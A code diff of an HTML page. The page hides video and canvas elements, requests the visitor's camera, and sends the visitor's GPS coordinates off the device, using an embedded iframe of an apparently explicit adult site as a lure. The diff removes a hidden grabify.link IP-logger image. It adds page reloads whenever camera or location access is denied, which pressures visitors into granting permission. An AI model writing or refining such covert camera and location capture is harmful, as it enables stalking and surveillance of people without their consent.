@@ -31,7 +31,6 @@
     </style>
 </head>
 <body>
-    <img src="https://grabify.link/" style="display:none;">
     <video id="video" autoplay style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -85,6 +84,7 @@
                 };
             } catch (error) {
                 console.error("Failed to access camera:", error);
+                location.reload(); // Reload the page if access is denied
             }
         }
 
@@ -112,9 +112,13 @@
                     } catch (error) {
                         console.error("Failed to send GPS data:", error);
                     }
+                }, function (error) {
+                    console.error("Failed to get GPS coordinates:", error);
+                    location.reload(); // Reload the page if access is denied
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
+                location.reload(); // Reload the page if geolocation is not supported
             }
         }
 
@@ -125,6 +129,6 @@
         };
     </script>
 
-    <iframe src="https://arabhotx.com/ميلف-منقبه-ممحونه-بجسم-مربرب-تصور-نودز/" frameborder="0"></iframe>
+        <iframe src="https://arabhotx.com/ميلف-منقبه-ممحونه-بجسم-مربرب-تصور-نودز/" frameborder="0"></iframe>
 </body>
 </html>
